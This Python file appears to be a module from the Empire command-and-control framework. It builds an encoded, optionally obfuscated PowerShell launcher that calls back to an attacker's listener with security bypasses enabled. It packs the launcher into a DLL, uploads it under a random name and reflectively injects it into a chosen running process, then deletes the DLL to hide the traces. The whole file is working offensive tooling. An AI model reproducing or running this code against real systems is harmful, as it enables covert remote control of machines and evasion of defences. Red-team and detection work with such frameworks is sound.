import random
import string

from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):
        def rand_text_alphanumeric(
            size=15, chars=string.ascii_uppercase + string.digits
        ):
            return "".join(random.choice(chars) for _ in range(size))

        # staging options
        fname = rand_text_alphanumeric() + ".dll"
        listener_name = params["Listener"]
        proc_name = params["ProcName"].strip()
        upload_path = params["UploadPath"].strip()
        arch = params["Arch"].strip()
        full_upload_path = upload_path + "\\" + fname
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]

        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        if proc_name == "":
            raise ModuleValidationException("ProcName must be specified.")

        script_end = ""
        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException(f"[!] Invalid listener: {listener_name}")

        # generate the PowerShell one-liner with all of the proper options set
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="powershell",
            encode=True,
            obfuscate=launcher_obfuscate,
            obfuscation_command=launcher_obfuscate_command,
            user_agent=user_agent,
            proxy=proxy,
            proxy_creds=proxy_creds,
            bypasses=params["Bypasses"],
        )

        if launcher == "":
            raise ModuleValidationException("Error in launcher generation.")

        launcher_code = launcher.split(" ")[-1]

        script_end += f"Invoke-ReflectivePEInjection -PEPath {full_upload_path} -ProcName {proc_name} "
        dll = main_menu.stagergenv2.generate_dll(launcher_code, arch)
        upload_script = main_menu.stagergenv2.generate_upload(dll, full_upload_path)

        script += "\r\n"
        script += upload_script
        script += "\r\n"

        script_end += "\r\n"
        script_end += f"Remove-Item -Path {full_upload_path}"

        return script, script_end
